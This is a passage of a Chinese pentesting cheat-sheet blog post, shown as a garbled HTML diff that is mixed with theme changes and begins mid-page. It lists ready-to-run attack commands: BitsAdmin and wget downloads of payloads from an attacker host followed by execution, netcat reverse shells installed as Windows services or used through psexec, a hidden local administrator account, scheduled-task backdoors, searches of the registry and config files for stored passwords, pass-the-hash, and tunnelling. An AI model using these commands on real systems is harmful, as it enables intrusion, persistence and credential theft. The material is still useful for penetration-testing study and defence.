+<h3 id="VBScript"><a href="#VBScript" class="headerlink" title="VBScript"></a>VBScript</h3><pre><code class="shell">cscript wget.vbs http://$ATTACKER/file.exe localfile.exe
+</code></pre>
+<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><pre><code class="shell">wget http://$ATTACKER/file
+curl http://$ATTACKER/file -O
+scp ~/file/file.bin user@$TARGET:tmp/backdoor.py
+</code></pre>
+<h3 id="NetCat"><a href="#NetCat" class="headerlink" title="NetCat"></a>NetCat</h3><pre><code class="shell"># Attacker
+nc -l -p 4444 &lt; /tool/file.exe
+
+# Victim
+nc $ATTACKER 4444 &gt; file.exe
+</code></pre>
+<h3 id="Windows-“debug-exe”-Method"><a href="#Windows-“debug-exe”-Method" class="headerlink" title="Windows “debug.exe” Method"></a>Windows “debug.exe” Method</h3><pre><code class="shell"># 1. In Linux, convert binary to hex ascii:
+wine /usr/share/windows-binaries/exe2bat.exe /root/tools/netcat/nc.exe nc.txt
+# 2. Paste nc.txt into Windows Shell.
+</code></pre>
+<h3 id="Windows-BitsAdmin"><a href="#Windows-BitsAdmin" class="headerlink" title="Windows BitsAdmin"></a>Windows BitsAdmin</h3><pre><code class="shell">cmd.exe /c &quot;bitsadmin /transfer myjob /download /priority high http://$ATTACKER/payload.exe %tmp%\payload.exe&amp;start %tmp%\payload.exe
+</code></pre>
+<h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><h3 id="利用服务进行持久化"><a href="#利用服务进行持久化" class="headerlink" title="利用服务进行持久化"></a>利用服务进行持久化</h3><pre><code class="shell"># cmd
+sc create spotlessSrv binpath= &quot;C:\nc.exe 10.11.0.245 443 -e C:\WINDOWS\System32\cmd.exe&quot; obj= &quot;LocalSystem&quot; password= &quot;&quot;
+
+# powersehll
+New-Service -Name EvilName -DisplayName EvilSvc -BinaryPathName &quot;&#39;C:\Program Files\NotEvil\back.exe&#39;&quot; -Description &quot;Not at all&quot;
+</code></pre>
+<h3 id="创建持久化后门"><a href="#创建持久化后门" class="headerlink" title="创建持久化后门"></a>创建持久化后门</h3><pre><code class="shell"># Launch evil.exe every 10 minutes
+schtasks /create /sc minute /mo 10 /tn &quot;TaskName&quot; /tr C:\Windows\system32\evil.exe
+</code></pre>
+<h3 id="创建用户并添加到本地管理员组"><a href="#创建用户并添加到本地管理员组" class="headerlink" title="创建用户并添加到本地管理员组"></a>创建用户并添加到本地管理员组</h3><pre><code class="shell">net user spotless spotless /add &amp; net localgroup Administrators spotless /add
+</code></pre>
+<h3 id="隐藏用户"><a href="#隐藏用户" class="headerlink" title="隐藏用户"></a>隐藏用户</h3><pre><code class="shell">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList&quot; /t REG_DWORD /v spotless /d 0 /f
+</code></pre>
+<h3 id="利用服务配置错误进行提权"><a href="#利用服务配置错误进行提权" class="headerlink" title="利用服务配置错误进行提权"></a>利用服务配置错误进行提权</h3><pre><code class="shell"># Look for SERVICE_ALL_ACCESS in the output
+accesschk.exe /accepteula -uwcqv &quot;Authenticated Users&quot; *
+
+sc config [service_name] binpath= &quot;C:\nc.exe 10.11.0.245 443 -e C:\WINDOWS\System32\cmd.exe&quot; obj= &quot;LocalSystem&quot; password= &quot;&quot;
+sc qc [service_name] (to verify!)
+sc start [service_name]
+</code></pre>
+<h3 id="递归查找隐藏文件"><a href="#递归查找隐藏文件" class="headerlink" title="递归查找隐藏文件"></a>递归查找隐藏文件</h3><pre><code class="shell">dir /A:H /s &quot;c:\program files&quot;
+</code></pre>
+<h3 id="检查文件-目录权限"><a href="#检查文件-目录权限" class="headerlink" title="检查文件&#x2F;目录权限"></a>检查文件&#x2F;目录权限</h3><pre><code class="shell">icacls.exe C:\folder /findsid userName-or-*sid /t
+//look for (F)ull, (M)odify, (W)rite
+</code></pre>
+<h3 id="检查Windows存储的凭据"><a href="#检查Windows存储的凭据" class="headerlink" title="检查Windows存储的凭据"></a>检查Windows存储的凭据</h3><pre><code class="shell">c:\unattend.xml
+c:\sysprep.inf
+c:\sysprep\sysprep.xml
+dir c:\*vnc.ini /s /b
+dir c:\*ultravnc.ini /s /b 
+dir c:\ /s /b | findstr /si *vnc.ini
+
+findstr /si password *.txt | *.xml | *.ini
+findstr /si pass *.txt | *.xml | *.ini
+dir /s *cred* == *pass* == *.conf
+
+# Windows Autologon
+reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;
+
+# VNC
+reg query &quot;HKCU\Software\ORL\WinVNC3\Password&quot;
+
+# Putty
+reg query &quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot;
+
+# Registry
+reg query HKLM /f password /t REG_SZ /s 
+reg query HKCU /f password /t REG_SZ /s
+</code></pre>
+<h3 id="检查未注册（引用）的服务"><a href="#检查未注册（引用）的服务" class="headerlink" title="检查未注册（引用）的服务"></a>检查未注册（引用）的服务</h3><pre><code class="shell">wmic service get name,displayname,pathname,startmode |findstr /i &quot;auto&quot; |findstr /i /v &quot;c:\windows\\&quot; |findstr /i /v &quot;&quot;&quot;
+wmic service get name,displayname,pathname,startmode | findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;
+</code></pre>
+<h3 id="开启进程"><a href="#开启进程" class="headerlink" title="开启进程"></a>开启进程</h3><h4 id="Powershell-1"><a href="#Powershell-1" class="headerlink" title="Powershell"></a>Powershell</h4><pre><code class="shell"># Requires PSRemoting
+$username = &#39;Administrator&#39;;$password = &#39;1234test&#39;;$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;Invoke-Command -Credential $credential -ComputerName COMPUTER_NAME -Command &#123; whoami &#125;
+
+# without PSRemoting
+cmd&gt; powershell Start-Process cmd.exe -Credential (New-Object System.Management.Automation.PSCredential &#39;username&#39;, (ConvertTo-SecureString &#39;password&#39; -AsPlainText -Force))
+
+# without PS Remoting, with arguments
+cmd&gt; powershell -command &quot;start-process cmd.exe -argumentlist &#39;/c calc&#39; -Credential (New-Object System.Management.Automation.PSCredential &#39;username&#39;,(ConvertTo-SecureString &#39;password&#39; -AsPlainText -Force))&quot;
+</code></pre>
+<h4 id="cmd"><a href="#cmd" class="headerlink" title="cmd"></a>cmd</h4><pre><code class="shell"># Requires interactive console
+runas /user:userName cmd.exe
+</code></pre>
+<h4 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h4><pre><code class="shell">psexec -accepteula -u user -p password cmd /c c:\temp\nc.exe 10.11.0.245 80 -e cmd.exe
+</code></pre>
+<h4 id="Pth-WinExe"><a href="#Pth-WinExe" class="headerlink" title="Pth-WinExe"></a>Pth-WinExe</h4><pre><code class="shell">pth-winexe -U user%pass --runas=user%pass //10.1.1.1 cmd.exe
+</code></pre>
+<h2 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h2><h3 id="SSH本地端口转发"><a href="#SSH本地端口转发" class="headerlink" title="SSH本地端口转发"></a>SSH本地端口转发</h3><pre><code class="shell"># Listen on local port 8080 and forward incoming traffic to REMOT_HOST:PORT via SSH_SERVER
+# Scenario: access a host that&#39;s being blocked by a firewall via SSH_SERVER;
+ssh -L 127.0.0.1:8080:REMOTE_HOST:PORT user@SSH_SERVER
+</code></pre>
+<h3 id="SSH动态端口转发"><a href="#SSH动态端口转发" class="headerlink" title="SSH动态端口转发"></a>SSH动态端口转发</h3><pre><code class="shell"># Listen on local port 8080. Incoming traffic to 127.0.0.1:8080 forwards it to final destination via SSH_SERVER
+# Scenario: proxy your web traffic through SSH tunnel OR access hosts on internal network via a compromised DMZ box;
+ssh -D 127.0.0.1:8080 user@SSH_SERVER
+</code></pre>
+<h3 id="SSH远程端口转发"><a href="#SSH远程端口转发" class="headerlink" title="SSH远程端口转发"></a>SSH远程端口转发</h3><pre><code class="shell"># Open port 5555 on SSH_SERVER. Incoming traffic to SSH_SERVER:5555 is tunneled to LOCALHOST:3389
+# Scenario: expose RDP on non-routable network;
+ssh -R 5555:LOCAL_HOST:3389 user@SSH_SERVER
+plink -R ATTACKER:ATTACKER_PORT:127.0.01:80 -l root -pw pw ATTACKER_IP
+</code></pre>
+<h3 id="Proxy-Tunnel"><a href="#Proxy-Tunnel" class="headerlink" title="Proxy Tunnel"></a>Proxy Tunnel</h3><pre><code class="shell"># Open a local port 127.0.0.1:5555. Incoming traffic to 5555 is proxied to DESTINATION_HOST through PROXY_HOST:3128
+# Scenario: a remote host has SSH running, but it&#39;s only bound to 127.0.0.1, but you want to reach it;
+proxytunnel -p PROXY_HOST:3128 -d DESTINATION_HOST:22 -a 5555
+ssh user@127.0.0.1 -p 5555
+</code></pre>
+<h3 id="HTTP隧道-SSH-Over-HTTP"><a href="#HTTP隧道-SSH-Over-HTTP" class="headerlink" title="HTTP隧道: SSH Over HTTP"></a>HTTP隧道: SSH Over HTTP</h3><pre><code class="shell"># Server - open port 80. Redirect all incoming traffic to localhost:80 to localhost:22
+hts -F localhost:22 80
+
+# Client - open port 8080. Redirect all incoming traffic to localhost:8080 to 192.168.1.15:80
+htc -F 8080 192.168.1.15:80
+
+# Client - connect to localhost:8080 -&gt; get tunneled to 192.168.1.15:80 -&gt; get redirected to 192.168.1.15:22
+ssh localhost -p 8080
+</code></pre>
+<h3 id="netsh端口转发"><a href="#netsh端口转发" class="headerlink" title="netsh端口转发"></a>netsh端口转发</h3><pre><code class="shell">#添加一个IPV4到IPV4的端口映射
+netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8080 connectaddress=192.168.75.130  connectport=8080
+
+#指定监听ip和端口可以删除
+netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4445
+
+#查看存在的转发
+netsh interface portproxy show all
+</code></pre>
 <blockquote>
 <p>参考链接：<a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets">Pentesting Cheatsheets</a></p>
 </blockquote>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://7mitu.github.io/2020/11/08/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%80%9F%E6%9F%A5%E8%A1%A8/" data-id="clllsxsnu000pjsy50c5t665g" data-title="渗透测试速查表" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CheckList/" rel="tag">CheckList</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li></ul>
-
-    </footer>
-  </div>
-  
-    
-<nav id="article-nav">
-  
-    <a href="/2020/11/25/%E9%81%BF%E5%BC%80Windows-API%E6%89%A7%E8%A1%8CShellcode/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Neuer</strong>
-      <div class="article-nav-title">
-        
-          避开Windows API执行Shellcode
-        
-      </div>
-    </a>
-  
-  
-</nav>
-
-  
-</article>
-
-
-</section>
-        
-          <aside id="sidebar">
-  
-    
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tags</h3>
-    <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CheckList/" rel="tag">CheckList</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HackTheBox/" rel="tag">HackTheBox</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/" rel="tag">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Shellcode/" rel="tag">Shellcode</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/powershell/" rel="tag">powershell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%85%8D%E6%9D%80/" rel="tag">免杀</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%90%8E%E6%B8%97%E9%80%8F/" rel="tag">后渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%BA%E7%A1%80/" rel="tag">基础</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8C%81%E4%B9%85%E5%8C%96/" rel="tag">持久化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AC%BA%E9%AA%97/" rel="tag">欺骗</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%88%AC%E8%99%AB/" rel="tag">爬虫</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9A%8F%E7%AC%94/" rel="tag">随笔</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tag Cloud</h3>
-    <div class="widget tagcloud">
-      <a href="/tags/CheckList/" style="font-size: 15px;">CheckList</a> <a href="/tags/HackTheBox/" style="font-size: 10px;">HackTheBox</a> <a href="/tags/Python/" style="font-size: 10px;">Python</a> <a href="/tags/Shellcode/" style="font-size: 20px;">Shellcode</a> <a href="/tags/powershell/" style="font-size: 10px;">powershell</a> <a href="/tags/%E5%85%8D%E6%9D%80/" style="font-size: 10px;">免杀</a> <a href="/tags/%E5%90%8E%E6%B8%97%E9%80%8F/" style="font-size: 15px;">后渗透</a> <a href="/tags/%E5%9F%BA%E7%A1%80/" style="font-size: 10px;">基础</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E6%8C%81%E4%B9%85%E5%8C%96/" style="font-size: 10px;">持久化</a> <a href="/tags/%E6%AC%BA%E9%AA%97/" style="font-size: 10px;">欺骗</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 10px;">渗透测试</a> <a href="/tags/%E7%88%AC%E8%99%AB/" style="font-size: 10px;">爬虫</a> <a href="/tags/%E9%9A%8F%E7%AC%94/" style="font-size: 10px;">随笔</a>
-    </div>
-  </div>
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archiv</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">letzter Beitrag</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2023/08/22/HackTheBox_PhoneBook_WriteUP/">HackTheBox PhoneBook WriteUP</a>
-          </li>
-        
-          <li>
-            <a href="/2021/04/28/%E5%85%B3%E4%BA%8ELinux%E4%B8%8B%E5%8F%8D%E5%BC%B9Shell%E5%91%BD%E4%BB%A4%E7%9A%84%E8%A7%A3%E9%87%8A/">关于Linux下反弹Shell命令的解释</a>
-          </li>
-        
-          <li>
-            <a href="/2021/04/09/%E6%89%B9%E9%87%8F%E4%BF%AE%E6%94%B9%E6%96%87%E4%BB%B6-%E6%96%87%E4%BB%B6%E5%A4%B9%E6%97%B6%E9%97%B4%E5%B1%9E%E6%80%A7/">利用Powershell修改文件/文件夹时间属性</a>
-          </li>
-        
-          <li>
-            <a href="/2021/01/26/%E4%B8%80%E4%B8%AAGet-Title%E5%BC%95%E5%87%BA%E7%9A%84%E5%9D%91/">一个Get-Title的自我修养</a>
-          </li>
-        
-          <li>
-            <a href="/2021/01/01/2020-2021/">2020 - 2021</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-
-  
-</aside>
-        
-      </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      
-      &copy; 2023 忘返<br>
-      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
-    </div>
-  </div>
-</footer>
-
-    </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
-    
-
-
-<script src="/js/jquery-3.6.4.min.js"></script>
-
-
-
-  
-<script src="/fancybox/jquery.fancybox.min.js"></script>
-
-
-
-
-<script src="/js/script.js"></script>
-
-
-
-
-
-  </div>
-</body>
-</html>
+</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="mailto:litreily@163.com">忘返</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2020/11/08/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%80%9F%E6%9F%A5%E8%A1%A8/">https://7mitu.github.io/2020/11/08/渗透测试速查表/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="https://7mitu.github.io">忘返的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tags"></i><a href="/tags/CheckList/">CheckList</a><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><aside id="toc"><div class="toc-title">目录</div><nav><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%A6%E5%AF%9F"><span class="toc-number">1.</span> <span class="toc-text">侦察</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%98%E6%B4%BBIP%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.</span> <span class="toc-text">存活IP扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%B9%E9%87%8FPing"><span class="toc-number">1.2.</span> <span class="toc-text">批量Ping</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%95%E4%B8%AA%E7%AB%AF%E5%8F%A3%E6%A3%80%E6%9F%A5"><span class="toc-number">1.3.</span> <span class="toc-text">单个端口检查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%91%E9%87%8F%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.4.</span> <span class="toc-text">少量端口探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nc%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.5.</span> <span class="toc-text">nc端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Masscan%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.6.</span> <span class="toc-text">Masscan端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS%E4%BF%A1%E6%81%AF%E6%9F%A5%E8%AF%A2-%E5%AD%90%E5%9F%9F%E5%90%8D%E7%88%86%E7%A0%B4"><span class="toc-number">1.7.</span> <span class="toc-text">DNS信息查询&#x2F;子域名爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NFS-Exported-Shares"><span class="toc-number">1.8.</span> <span class="toc-text">NFS Exported Shares</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberos%E6%9E%9A%E4%B8%BE"><span class="toc-number">1.9.</span> <span class="toc-text">Kerberos枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%EF%BC%88%E7%AE%80%E6%98%93%EF%BC%89"><span class="toc-number">1.10.</span> <span class="toc-text">Web漏洞扫描（简易）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RPC-NetBios-SMB%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.11.</span> <span class="toc-text">RPC&#x2F;NetBios&#x2F;SMB探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SNMP%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.12.</span> <span class="toc-text">SNMP探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SMTP%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.13.</span> <span class="toc-text">SMTP探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.14.</span> <span class="toc-text">域信息探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Powershell%E4%B8%8B%E7%9A%84%E7%AB%AF%E5%8F%A3%E7%9B%91%E5%90%AC"><span class="toc-number">1.15.</span> <span class="toc-text">Powershell下的端口监听</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9Shell"><span class="toc-number">2.</span> <span class="toc-text">反弹Shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Bash"><span class="toc-number">2.1.</span> <span class="toc-text">Bash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Perl"><span class="toc-number">2.2.</span> <span class="toc-text">Perl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python"><span class="toc-number">2.3.</span> <span class="toc-text">Python</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP"><span class="toc-number">2.4.</span> <span class="toc-text">PHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ruby"><span class="toc-number">2.5.</span> <span class="toc-text">Ruby</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Netcat-without-e"><span class="toc-number">2.6.</span> <span class="toc-text">Netcat without -e</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Telnet-Linux"><span class="toc-number">2.7.</span> <span class="toc-text">Telnet(Linux)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java"><span class="toc-number">2.8.</span> <span class="toc-text">Java</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XTerm"><span class="toc-number">2.9.</span> <span class="toc-text">XTerm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E4%BA%A4%E4%BA%92%E5%BC%8Fshell%E5%8D%87%E7%BA%A7"><span class="toc-number">2.10.</span> <span class="toc-text">非交互式shell升级</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JDWP-RCE"><span class="toc-number">3.</span> <span class="toc-text">JDWP RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%A8%E9%A9%AC%E7%94%9F%E6%88%90"><span class="toc-number">4.</span> <span class="toc-text">木马生成</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#msf%E7%94%9F%E6%88%90%E6%9C%89%E6%95%88%E8%BD%BD%E8%8D%B7"><span class="toc-number">4.1.</span> <span class="toc-text">msf生成有效载荷</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E4%B8%8B%E7%BC%96%E8%AF%91c%E4%BB%A3%E7%A0%81"><span class="toc-number">4.2.</span> <span class="toc-text">Linux下编译c代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows%E4%B8%8B%E7%BC%96%E8%AF%91%E4%B8%BA-obj"><span class="toc-number">4.3.</span> <span class="toc-text">Windows下编译为.obj</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#py%E6%96%87%E4%BB%B6%E8%BD%AC%E6%8D%A2exe"><span class="toc-number">4.4.</span> <span class="toc-text">py文件转换exe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E6%9C%89%E6%95%88%E8%BD%BD%E8%8D%B7%E6%A8%A1%E5%BC%8F%E5%B9%B6%E8%AE%A1%E7%AE%97%E5%81%8F%E7%A7%BB%E9%87%8F"><span class="toc-number">4.5.</span> <span class="toc-text">生成有效载荷模式并计算偏移量</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">5.</span> <span class="toc-text">WEB文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">5.1.</span> <span class="toc-text">绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%B6%E4%BD%9C%E5%9B%BE%E7%89%87%E9%A9%AC"><span class="toc-number">5.2.</span> <span class="toc-text">制作图片马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#htaccess%E6%96%87%E4%BB%B6%E9%85%8D%E7%BD%AE"><span class="toc-number">5.3.</span> <span class="toc-text">.htaccess文件配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E4%B8%8A%E4%BC%A0WebShell"><span class="toc-number">5.4.</span> <span class="toc-text">SQL注入上传WebShell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E6%9A%B4%E7%A0%B4"><span class="toc-number">6.</span> <span class="toc-text">密码暴破</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hydra%E7%A0%B4%E8%A7%A3Web%E6%9C%8D%E5%8A%A1%E5%AF%86%E7%A0%81"><span class="toc-number">6.1.</span> <span class="toc-text">hydra破解Web服务密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hydra%E7%A0%B4%E8%A7%A3%E9%80%9A%E7%94%A8%E5%8D%8F%E8%AE%AE%E5%8F%A3%E4%BB%A4"><span class="toc-number">6.2.</span> <span class="toc-text">hydra破解通用协议口令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hashcat"><span class="toc-number">6.3.</span> <span class="toc-text">hashcat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A0%B4%E8%A7%A3zip%E6%96%87%E4%BB%B6%E5%AF%86%E7%A0%81"><span class="toc-number">6.4.</span> <span class="toc-text">破解zip文件密码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E4%BF%A1%E6%81%AF%E6%8C%96%E6%8E%98"><span class="toc-number">7.</span> <span class="toc-text">本地信息挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E5%8F%AF%E8%AF%BB-%E5%86%99%E6%96%87%E4%BB%B6%E5%A4%B9"><span class="toc-number">7.1.</span> <span class="toc-text">寻找可读&#x2F;写文件夹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E6%98%AF%E5%90%A6%E5%B7%B2%E5%90%AF%E7%94%A8Powershell%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95"><span class="toc-number">7.2.</span> <span class="toc-text">检查是否已启用Powershell日志记录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5WinEvent%E6%97%A5%E5%BF%97%E4%B8%AD%E6%98%AF%E5%90%A6%E6%9C%89SecureString"><span class="toc-number">7.3.</span> <span class="toc-text">检查WinEvent日志中是否有SecureString</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5WinEvent%E7%9A%84%E6%9C%BA%E5%99%A8%E5%94%A4%E9%86%92-%E7%9D%A1%E7%9C%A0%E6%97%B6%E9%97%B4"><span class="toc-number">7.4.</span> <span class="toc-text">检查WinEvent的机器唤醒&#x2F;睡眠时间</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93"><span class="toc-number">8.</span> <span class="toc-text">文件传输</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TFTP"><span class="toc-number">8.1.</span> <span class="toc-text">TFTP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FTP"><span class="toc-number">8.2.</span> <span class="toc-text">FTP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CertUtil"><span class="toc-number">8.3.</span> <span class="toc-text">CertUtil</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python-1"><span class="toc-number">8.4.</span> <span class="toc-text">Python</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Powershell"><span class="toc-number">8.5.</span> <span class="toc-text">Powershell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#VBScript"><span class="toc-number">8.6.</span> <span class="toc-text">VBScript</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux"><span class="toc-number">8.7.</span> <span class="toc-text">Linux</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NetCat"><span class="toc-number">8.8.</span> <span class="toc-text">NetCat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-%E2%80%9Cdebug-exe%E2%80%9D-Method"><span class="toc-number">8.9.</span> <span class="toc-text">Windows “debug.exe” Method</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-BitsAdmin"><span class="toc-number">8.10.</span> 